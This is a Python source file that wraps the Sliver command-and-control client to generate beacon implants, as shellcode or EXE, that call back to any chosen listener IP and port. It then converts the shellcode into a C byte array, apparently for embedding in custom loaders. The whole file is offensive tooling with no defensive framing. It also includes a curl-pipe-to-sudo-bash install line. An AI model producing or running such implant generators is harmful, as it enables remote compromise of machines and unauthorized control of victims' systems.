"""Sliver C2 Adapter - Generate beacons with any IP"""
import subprocess
import os
from pathlib import Path

def generate_beacon(listener_ip, listener_port=443, arch="x64", output_format="shellcode"):
    """
    Generate Sliver beacon with dynamic IP

    Args:
        listener_ip: ANY IP address (10.0.0.1, 192.168.1.5, public IP, etc.)
        listener_port: Port (default 443)
        arch: x64 or x86
        output_format: shellcode or exe

    Returns:
        dict with shellcode_path, shellcode_bytes, c_array
    """

    # Check if sliver-client exists
    try:
        subprocess.run(["which", "sliver-client"], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        return {
            "success": False,
            "error": "Sliver not installed",
            "install_cmd": "curl https://sliver.sh/install | sudo bash"
        }

    # Create output directory
    output_dir = Path("output/beacons")
    output_dir.mkdir(parents=True, exist_ok=True)

    # Generate beacon name
    beacon_name = f"beacon_{listener_ip.replace('.', '_')}_{listener_port}"

    try:
        if output_format == "shellcode":
            # Generate shellcode beacon
            cmd = [
                "sliver-client",
                "generate",
                "beacon",
                "--http", f"{listener_ip}:{listener_port}",
                "--arch", arch,
                "--format", "shellcode",
                "--save", str(output_dir),
                "--name", beacon_name,
                "--skip-symbols"
            ]
        else:
            # Generate EXE beacon
            cmd = [
                "sliver-client",
                "generate",
                "beacon",
                "--http", f"{listener_ip}:{listener_port}",
                "--arch", arch,
                "--format", "exe",
                "--save", str(output_dir),
                "--name", beacon_name,
                "--skip-symbols"
            ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        if result.returncode != 0:
            return {
                "success": False,
                "error": f"Sliver generation failed: {result.stderr}",
                "hint": "Make sure Sliver server is running and listener is active"
            }

        # Find generated file
        if output_format == "shellcode":
            shellcode_file = output_dir / f"{beacon_name}.bin"
        else:
            shellcode_file = output_dir / f"{beacon_name}.exe"

        if not shellcode_file.exists():
            # Try alternate naming
            files = list(output_dir.glob(f"*{beacon_name}*"))
            if files:
                shellcode_file = files[0]
            else:
                return {
                    "success": False,
                    "error": "Beacon file not found after generation"
                }

        # Read shellcode bytes
        with open(shellcode_file, 'rb') as f:
            shellcode_bytes = f.read()

        # Convert to C array format
        c_array = "unsigned char shellcode[] = {\n"
        for i in range(0, len(shellcode_bytes), 12):
            chunk = shellcode_bytes[i:i+12]
            hex_bytes = ', '.join(f'0x{b:02x}' for b in chunk)
            if i + 12 < len(shellcode_bytes):
                c_array += f"    {hex_bytes},\n"
            else:
                c_array += f"    {hex_bytes}\n"
        c_array += "};\nunsigned int shellcode_len = " + str(len(shellcode_bytes)) + ";"

        return {
            "success": True,
            "shellcode_path": str(shellcode_file),
            "shellcode_bytes": shellcode_bytes,
            "shellcode_size": len(shellcode_bytes),
            "c_array": c_array,
            "listener": f"{listener_ip}:{listener_port}",
            "architecture": arch,
            "format": output_format
        }

    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "Sliver generation timed out (60s)",
            "hint": "Check if Sliver server is responsive"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Unexpected error: {str(e)}"
        }
